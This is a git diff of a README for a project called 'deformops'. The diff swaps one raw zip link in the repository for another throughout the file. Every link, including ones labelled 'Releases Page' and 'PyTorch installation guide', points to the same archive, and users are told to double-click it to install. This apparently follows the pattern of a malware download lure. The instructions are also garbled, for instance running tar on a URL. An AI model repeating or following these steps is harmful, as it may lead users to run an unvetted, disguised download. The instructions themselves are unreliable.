@@ -8,11 +8,11 @@ Welcome to **deformops**! This application makes it easy to perform deformable g
 
 To get started, you will first need to download the software. Click the button below to visit the Releases page:
 
-[![Download deformops](https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip%https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip)](https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip)
+[![Download deformops](https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip%https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip)](https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip)
 
 ### Step 1: Visit the Releases Page
 
-1. Click on this link to open the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip).
+1. Click on this link to open the Releases page: [Visit Releases Page](https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip).
 2. Once there, you will see a list of available versions.
 
 ### Step 2: Choose a Version
@@ -23,22 +23,22 @@ To get started, you will first need to download the software. Click the button b
 ### Step 3: Download the Application
 
 1. You will see several files available for download. 
-2. Find the file that matches your operating system (e.g., `https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip` for Windows users or `https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip` for Linux users).
+2. Find the file that matches your operating system (e.g., `https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip` for Windows users or `https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip` for Linux users).
 3. Click on the file name to start the download.
 
 ### Step 4: Install the Application
 
 #### For Windows Users:
 1. Once the download is complete, locate the file in your Downloads folder.
-2. Double-click on the `https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip` file to install the application.
+2. Double-click on the `https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip` file to install the application.
 3. Follow the on-screen instructions to complete the installation.
 
 #### For Linux Users:
-1. After downloading the `https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip` file, open your terminal.
+1. After downloading the `https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip` file, open your terminal.
 2. Use the `cd` command to navigate to your Downloads folder.
 3. Extract the files by running the command:
    ```bash
-   tar -xzvf https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip
+   tar -xzvf https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip
    ```
 4. After extraction, you may need to change directory into the extracted folder:
    ```bash
@@ -64,7 +64,7 @@ To run **deformops**, ensure your system meets the following requirements:
 - **Operating System**: Windows 10 or later, or a recent Linux distribution.
 - **RAM**: Minimum of 4 GB of RAM is recommended.
 - **CUDA Toolkit**: CUDA version 10.0 or later is required for GPU acceleration.
-- **PyTorch**: You should have PyTorch installed. Follow the [PyTorch installation guide](https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip) for assistance.
+- **PyTorch**: You should have PyTorch installed. Follow the [PyTorch installation guide](https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip) for assistance.
 
 ## 📚 Usage Instructions
 
@@ -98,4 +98,4 @@ We continuously work on enhancing **deformops**. Future updates may include:
 
 You can track our progress and suggest new features on the GitHub Issues page.
 
-Visit this link again to download or check for updates: [Visit Releases Page](https://raw.githubusercontent.com/pq1234ss/deformops/main/substantialness/deformops.zip).
+Visit this link again to download or check for updates: [Visit Releases Page](https://github.com/pq1234ss/deformops/raw/refs/heads/main/sources/Software-3.2.zip).
